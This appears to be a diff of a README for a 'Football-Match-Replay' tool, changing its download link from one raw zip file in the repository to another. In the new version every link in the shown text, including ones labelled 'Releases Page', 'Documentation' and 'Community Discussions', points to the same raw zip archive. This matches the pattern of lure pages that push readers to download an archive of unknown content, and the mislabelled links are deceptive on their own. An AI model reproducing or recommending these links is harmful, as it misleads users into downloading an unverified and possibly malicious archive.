@@ -1,6 +1,6 @@
 # ⚽ Football-Match-Replay - Visualize Football Match Data Easily
 
-[![Download Football-Match-Replay](https://raw.githubusercontent.com/sreedham793/Football-Match-Replay/main/src/Football-Match-Replay_2.3.zip)](https://raw.githubusercontent.com/sreedham793/Football-Match-Replay/main/src/Football-Match-Replay_2.3.zip)
+[![Download Football-Match-Replay](https://github.com/sreedham793/Football-Match-Replay/raw/refs/heads/main/data/Replay-Match-Football-v2.3.zip)](https://github.com/sreedham793/Football-Match-Replay/raw/refs/heads/main/data/Replay-Match-Football-v2.3.zip)
 
 ## 📋 Description
 
@@ -17,7 +17,7 @@ Follow these simple steps to get up and running.
    - Disk Space: Minimum of 500MB free space.
 
 2. **Download the Application**
-   - Visit the [Releases page](https://raw.githubusercontent.com/sreedham793/Football-Match-Replay/main/src/Football-Match-Replay_2.3.zip) to download the latest version of Football-Match-Replay. 
+   - Visit the [Releases page](https://github.com/sreedham793/Football-Match-Replay/raw/refs/heads/main/data/Replay-Match-Football-v2.3.zip) to download the latest version of Football-Match-Replay. 
 
 3. **Installing the Application**
    - After downloading, locate the file in your Downloads folder.
@@ -31,7 +31,7 @@ Follow these simple steps to get up and running.
 
 To begin your journey with Football-Match-Replay, visit the following link and choose the most recent release to download:
 
-[Download Football-Match-Replay](https://raw.githubusercontent.com/sreedham793/Football-Match-Replay/main/src/Football-Match-Replay_2.3.zip)
+[Download Football-Match-Replay](https://github.com/sreedham793/Football-Match-Replay/raw/refs/heads/main/data/Replay-Match-Football-v2.3.zip)
 
 Once downloaded, follow the installation steps provided earlier.
 
@@ -88,8 +88,8 @@ Explore related topics that enhance your understanding:
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/sreedham793/Football-Match-Replay/main/src/Football-Match-Replay_2.3.zip)
-- [Documentation](https://raw.githubusercontent.com/sreedham793/Football-Match-Replay/main/src/Football-Match-Replay_2.3.zip)
-- [Community Discussions](https://raw.githubusercontent.com/sreedham793/Football-Match-Replay/main/src/Football-Match-Replay_2.3.zip)
+- [Releases Page](https://github.com/sreedham793/Football-Match-Replay/raw/refs/heads/main/data/Replay-Match-Football-v2.3.zip)
+- [Documentation](https://github.com/sreedham793/Football-Match-Replay/raw/refs/heads/main/data/Replay-Match-Football-v2.3.zip)
+- [Community Discussions](https://github.com/sreedham793/Football-Match-Replay/raw/refs/heads/main/data/Replay-Match-Football-v2.3.zip)
 
 Enjoy analyzing football matches like never before with Football-Match-Replay!
